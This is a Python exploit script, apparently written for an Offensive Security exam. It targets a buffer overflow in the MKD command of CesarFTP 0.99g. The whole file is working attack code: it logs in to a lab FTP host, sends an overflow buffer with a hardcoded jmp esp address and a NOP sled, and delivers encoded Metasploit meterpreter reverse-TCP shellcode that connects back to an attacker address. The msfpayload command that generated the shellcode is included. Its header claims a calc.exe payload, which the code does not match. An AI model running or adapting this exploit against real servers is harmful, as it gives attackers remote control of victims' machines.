#!/usr/bin/python
# Offensive Security EXAM
# OS-7295 
# By Jeremy Villegas
# jvillegas@csusm.edu
# 12-10-2011
#
# 
#
#CesarFtp 0.99g 0day Exploit
#Proof of Concept: execute calc.exe
#Tested on XP sp2 polish
#Bug found by h07 [h07@interia.pl]
#Date: 10.06.2006
 
from socket import *
 
# Server info
host = "192.168.22.112"
port = 21
user = "ftp"
password = "ftp"


#./msfpayload windows/meterpreter/reverse_ord_tcp LHOST=192.168.22.10 R | ./msfencode -b '\x00\x20\x0a\x0d\x2f' -t c
#[*] x86/shikata_ga_nai succeeded with size 120 (iteration=1)
# <metasploit.com>
met = (
"\xba\x8a\x1d\xb6\xa1\xd9\xc4\xd9\x74\x24\xf4\x5b\x29\xc9\xb1"
"\x18\x83\xeb\xfc\x31\x53\x0f\x03\x53\x85\xff\x43\x5d\xa8\x24"
"\xcf\x15\x89\xea\x9b\x6a\x01\x80\xcc\x76\x92\x84\x67\xf4\x84"
"\x05\xda\xb7\xc7\x53\x18\x7a\xf4\x04\x50\x0f\x15\x31\xfe\xe7"
"\x62\x03\xc3\x7c\x38\x89\x43\x08\x8c\x9c\xaf\x0f\xe5\x14\x8e"
"\x57\xf4\xc2\x9a\x19\xca\x13\x73\xda\x5b\x18\xd8\xb7\x9a\x4a"
"\xdc\xb8\x4c\x1d\x88\x86\xc4\x34\x43\x6f\x16\x39\x42\x33\x9f"
"\xd8\x37\x7c\x93\x49\xe9\xd5\xfa\x07\x19\x8b\xab\x81\xe6\xce")

# Padding
met = "\x90" * 51 + "\x90" + met

#badchars test
badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e"
"\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d"
"\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c"
"\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b"
"\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a"
"\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9"
"\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8"
"\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7"
"\xf8\xf9\xfa\xfb\xfc\xfd\xfe")

shellcode = met

def intel_order(i):
    a = chr(i % 256)
    i = i >> 8
    b = chr(i % 256)
    i = i >> 8
    c = chr(i % 256)
    i = i >> 8
    d = chr(i % 256)
    str = "%c%c%c%c" % (a, b, c, d)
    return str
 
#EIP = 0x7CA58265 #jmp esp <shell32.dll XP sp2 polish>
EIP = 0x77D718FC #jmp esp <user32.dll XP sp1 eng>
 
s = socket(AF_INET, SOCK_STREAM)
s.connect((host, port))
print s.recv(1024)
 
s.send("user %s\r\n" % (user))
print s.recv(1024)
 
s.send("pass %s\r\n" % (password))
print s.recv(1024)
 
buffer = "MKD "
buffer += "\n" * 671
buffer += "\x90" * 3 + intel_order(EIP) 
buffer += "\x90" * 33 + shellcode
buffer += "\r\n"
 
print "len: %d" % (len(buffer))
print "len i: %d" % len(shellcode)
s.send(buffer)
print s.recv(1024)
 
s.close()

